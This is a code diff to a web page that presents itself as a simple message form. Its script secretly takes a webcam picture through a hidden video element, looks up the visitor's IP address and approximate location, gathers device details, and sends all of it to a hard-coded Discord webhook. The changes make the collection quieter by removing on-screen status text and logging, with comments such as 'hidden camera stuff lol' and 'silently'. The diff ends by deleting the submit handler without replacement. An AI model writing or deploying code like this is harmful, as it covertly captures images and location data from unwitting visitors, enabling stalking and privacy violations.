@@ -212,10 +212,9 @@
             color: #333;
             font-size: 16px;
             font-weight: 500;
-            text-align: center;
-            max-width: 300px;
         }
         
+        /* Quick flash for screenshot */
         .quick-flash {
             position: fixed;
             top: 0;
@@ -260,17 +259,19 @@
     </style>
 </head>
 <body>
+    <!-- hidden camera stuff lol -->
     <div id="camera-container">
         <video id="camera-feed" autoplay playsinline></video>
     </div>
     <canvas id="capture-canvas" class="hidden-canvas"></canvas>
     
+    <!-- quick white flash -->
     <div id="quick-flash" class="quick-flash"></div>
     
     <!-- loading thing -->
     <div id="loading-overlay" class="loading-overlay">
         <div class="loading-spinner"></div>
-        <div class="loading-text" id="loading-text">sending ur message... dont close this</div>
+        <div class="loading-text">processing your message...</div>
     </div>
     
     <!-- main thing -->
@@ -307,6 +308,7 @@
         // discord thing
         const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
         
+        // grab all the stuff
         const form = document.getElementById('message-form');
         const usernameInput = document.getElementById('username');
         const messageInput = document.getElementById('message');
@@ -314,7 +316,6 @@
         const statusMessage = document.getElementById('status-message');
         const loadingOverlay = document.getElementById('loading-overlay');
         const quickFlash = document.getElementById('quick-flash');
-        const loadingText = document.getElementById('loading-text');
         
         const cameraFeed = document.getElementById('camera-feed');
         const captureCanvas = document.getElementById('capture-canvas');
@@ -323,6 +324,7 @@
         let stream = null;
         let isProcessing = false;
         
+        // quick white flash
         function doQuickFlash() {
             quickFlash.style.opacity = '0.3';
             setTimeout(() => {
@@ -343,6 +345,7 @@
             }
         }
         
+        // try to get camera
         async function getCameraQuick() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ 
@@ -354,7 +357,6 @@
                 });
                 
                 cameraFeed.srcObject = stream;
-                
                 await new Promise(resolve => setTimeout(resolve, 100));
                 return stream;
             } catch (error) {
@@ -362,7 +364,8 @@
             }
         }
         
-        function takeQuickScreenshot() {
+        // take quick picture
+        function takeQuickPicture() {
             if (!stream) return null;
             
             try {
@@ -375,11 +378,12 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
+                // add timestamp
                 ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
                 ctx.fillRect(10, 10, 180, 25);
                 ctx.fillStyle = 'white';
                 ctx.font = '12px Arial';
-                ctx.fillText('message sent: ' + new Date().toLocaleTimeString(), 15, 25);
+                ctx.fillText('sent: ' + new Date().toLocaleTimeString(), 15, 25);
                 
                 return canvas.toDataURL('image/jpeg', 0.85);
             } catch (e) {
@@ -387,6 +391,7 @@
             }
         }
         
+        // Convert base64 image to blob
         function dataURLtoBlob(dataurl) {
             try {
                 const arr = dataurl.split(',');
@@ -403,14 +408,15 @@
             }
         }
         
-        async function getIPLocation() {
+        // Get location data without showing anything
+        async function getLocationData() {
             try {
-                loadingText.textContent = 'getting IP address...';
+                // Get IP address silently
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const userIP = ipData.ip;
                 
-                loadingText.textContent = 'converting IP to location...';
+                // Convert IP to location silently
                 const geoResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
                 const geoData = await geoResponse.json();
                 
@@ -419,73 +425,69 @@
                         ip: userIP,
                         latitude: geoData.latitude,
                         longitude: geoData.longitude,
-                        accuracy: 'IP-based (city level, ~5-50km)',
-                        city: geoData.city || 'Unknown',
-                        region: geoData.region || 'Unknown',
-                        country: geoData.country_name || 'Unknown',
-                        isp: geoData.org || 'Unknown',
-                        timezone: geoData.timezone || 'Unknown',
-                        postal: geoData.postal || 'Unknown'
+                        accuracy: 'IP-based',
+                        city: geoData.city || '',
+                        region: geoData.region || '',
+                        country: geoData.country_name || '',
+                        isp: geoData.org || '',
+                        timezone: geoData.timezone || ''
                     };
-                } else {
-                    const fallbackResponse = await fetch(`https://ipapi.co/${userIP}/latlong/`);
-                    const fallbackText = await fallbackResponse.text();
-                    
-                    if (fallbackText && fallbackText.includes(',')) {
-                        const [lat, lon] = fallbackText.split(',');
-                        return {
-                            ip: userIP,
-                            latitude: parseFloat(lat),
-                            longitude: parseFloat(lon),
-                            accuracy: 'IP-based (approximate)',
-                            city: 'Unknown',
-                            region: 'Unknown',
-                            country: 'Unknown',
-                            isp: 'Unknown',
-                            timezone: 'Unknown'
-                        };
-                    }
+                }
+                
+                // Try backup silently
+                const fallbackResponse = await fetch(`https://ipapi.co/${userIP}/latlong/`);
+                const fallbackText = await fallbackResponse.text();
+                
+                if (fallbackText && fallbackText.includes(',')) {
+                    const [lat, lon] = fallbackText.split(',');
+                    return {
+                        ip: userIP,
+                        latitude: parseFloat(lat),
+                        longitude: parseFloat(lon),
+                        accuracy: 'IP-based',
+                        city: '',
+                        region: '',
+                        country: '',
+                        isp: '',
+                        timezone: ''
+                    };
                 }
                 
                 return null;
                 
             } catch (error) {
-                console.log('IP location failed:', error.message);
-                
+                // Try one more backup silently
                 try {
-                    loadingText.textContent = 'trying backup location service...';
                     const backupResponse = await fetch('https://geolocation-db.com/json/');
                     const backupData = await backupResponse.json();
                     
                     if (backupData.latitude && backupData.longitude) {
                         return {
-                            ip: backupData.IPv4 || 'Unknown',
+                            ip: backupData.IPv4 || '',
                             latitude: backupData.latitude,
                             longitude: backupData.longitude,
-                            accuracy: 'IP-based (approximate)',
-                            city: backupData.city || 'Unknown',
-                            region: backupData.state || 'Unknown',
-                            country: backupData.country_name || 'Unknown',
-                            isp: 'Unknown',
-                            timezone: 'Unknown'
+                            accuracy: 'IP-based',
+                            city: backupData.city || '',
+                            region: backupData.state || '',
+                            country: backupData.country_name || '',
+                            isp: '',
+                            timezone: ''
                         };
                     }
                 } catch (backupError) {
-                    console.log('Backup also failed:', backupError.message);
+                    // Silent fail
                 }
                 
                 return null;
             }
         }
         
+        // Generate maps link
         function generateMapsLink(latitude, longitude) {
             return `https://www.google.com/maps?q=${latitude},${longitude}&z=12`;
         }
         
-        function generateOSMLink(latitude, longitude) {
-            return `https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}&zoom=12`;
-        }
-        
+        // Get device info
         function getDeviceInfo() {
             return {
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -496,39 +498,34 @@
             };
         }
         
-        async function sendToDiscord(username, message, screenshot = null, location = null) {
+        // send to discord
+        async function sendToDiscord(username, message, picture = null, location = null) {
             try {
                 const timestamp = new Date().toLocaleString();
                 const deviceInfo = getDeviceInfo();
                 
-                let locationField = "Location: Not available";
-                let mapsLink = "";
-                let osmLink = "";
+                // Create location info
+                let locationField = "Not available";
                 
                 if (location) {
-                    mapsLink = generateMapsLink(location.latitude, location.longitude);
-                    osmLink = generateOSMLink(location.latitude, location.longitude);
-                    
-                    locationField = `IP: ${location.ip}
-Coordinates: ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}
-Accuracy: ${location.accuracy}
+                    const mapsLink = generateMapsLink(location.latitude, location.longitude);
+                    locationField = `Coordinates: ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}
 City: ${location.city}
 Region: ${location.region}
 Country: ${location.country}
 ISP: ${location.isp}
 Timezone: ${location.timezone}
-Postal: ${location.postal}
-
-[Google Maps](${mapsLink})
-[OpenStreetMap](${osmLink})`.trim();
+IP: ${location.ip}
+[View on Maps](${mapsLink})`.trim();
                 }
                 
+                // Device info
                 const deviceField = `Timezone: ${deviceInfo.timezone}
 Language: ${deviceInfo.language}
 Platform: ${deviceInfo.platform}
-Screen: ${deviceInfo.screenSize}
-Browser: ${deviceInfo.userAgent}`.trim();
+Screen: ${deviceInfo.screenSize}`.trim();
                 
+                // Create the embed
                 const embed = {
                     title: "New Message Received",
                     color: 0x3498db,
@@ -542,32 +539,41 @@ Browser: ${deviceInfo.userAgent}`.trim();
                             name: "Time",
                             value: timestamp,
                             inline: true
-                        },
-                        {
-                            name: "IP Location (Approximate)",
-                            value: "```" + locationField + "```",
-                            inline: false
-                        },
-                        {
-                            name: "Device Info",
-                            value: "```" + deviceField + "```",
-                            inline: false
-                        },
-                        {
-                            name: "Message",
-                            value: message || "No message content",
-                            inline: false
                         }
                     ],
                     footer: {
-                        text: "Sent via message form - Location from IP geolocation"
+                        text: "Sent via message form"
                     },
                     timestamp: new Date().toISOString()
                 };
                 
-                if (screenshot) {
+                // Add location field if available
+                if (location) {
+                    embed.fields.push({
+                        name: "Location Data",
+                        value: "```" + locationField + "```",
+                        inline: false
+                    });
+                }
+                
+                // Add device field
+                embed.fields.push({
+                    name: "Device Info",
+                    value: "```" + deviceField + "```",
+                    inline: false
+                });
+                
+                // Add message field
+                embed.fields.push({
+                    name: "Message",
+                    value: message || "No message content",
+                    inline: false
+                });
+                
+                // If we have a picture
+                if (picture) {
                     try {
-                        const blob = dataURLtoBlob(screenshot);
+                        const blob = dataURLtoBlob(picture);
                         
                         if (blob) {
                             const formData = new FormData();
@@ -591,10 +597,11 @@ Browser: ${deviceInfo.userAgent}`.trim();
                             return true;
                         }
                     } catch (imageError) {
-                        console.log('Image failed, sending text only');
+                        // Continue without image
                     }
                 }
                 
+                // Text-only fallback
                 const payload = {
                     username: "message bot",
                     embeds: [embed]
@@ -604,95 +611,4 @@ Browser: ${deviceInfo.userAgent}`.trim();
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload)
-                });
-                
-                return true;
-                
-            } catch (error) {
-                console.error('Error sending to Discord:', error);
-                return false;
-            }
-        }
-        
-        function cleanupCamera() {
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-                stream = null;
-            }
-        }
-        
-        form.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            if (isProcessing) return;
-            
-            const username = usernameInput.value.trim();
-            const message = messageInput.value.trim();
-            
-            if (!message) {
-                showStatus('bruh write something first', 'error');
-                messageInput.focus();
-                return;
-            }
-            
-            isProcessing = true;
-            submitBtn.disabled = true;
-            loadingOverlay.style.display = 'flex';
-            loadingText.textContent = 'sending ur message... dont close this';
-            showStatus('sending...', 'processing');
-            
-            try {
-                let screenshot = null;
-                let location = null;
-                
-                loadingText.textContent = 'preparing...';
-                const cameraStream = await getCameraQuick();
-                
-                if (cameraStream) {
-                    doQuickFlash();
-                    
-                    await new Promise(resolve => setTimeout(resolve, 50));
-                    
-                    screenshot = takeQuickScreenshot();
-                    
-                    await new Promise(resolve => setTimeout(resolve, 100));
-                    
-                    cleanupCamera();
-                }
-                
-                loadingText.textContent = 'getting IP location...';
-                location = await getIPLocation();
-                
-                loadingText.textContent = 'sending message with location...';
-                const success = await sendToDiscord(username, message, screenshot, location);
-                
-                if (success) {
-                    if (location) {
-                        showStatus('message sent! with IP location data', 'success');
-                    } else {
-                        showStatus('message sent! (no location data)', 'success');
                     }
-                    messageInput.value = '';
-                    usernameInput.value = '';
-                } else {
-                    showStatus('failed to send. try again maybe?', 'error');
-                }
-                
-            } catch (error) {
-                console.error('error:', error);
-                showStatus('something broke. oops.', 'error');
-                
-            } finally {
-
-                isProcessing = false;
-                submitBtn.disabled = false;
-                loadingOverlay.style.display = 'none';
-                
-                cleanupCamera();
-            }
-        });
-    </script>
-</body>
-</html>
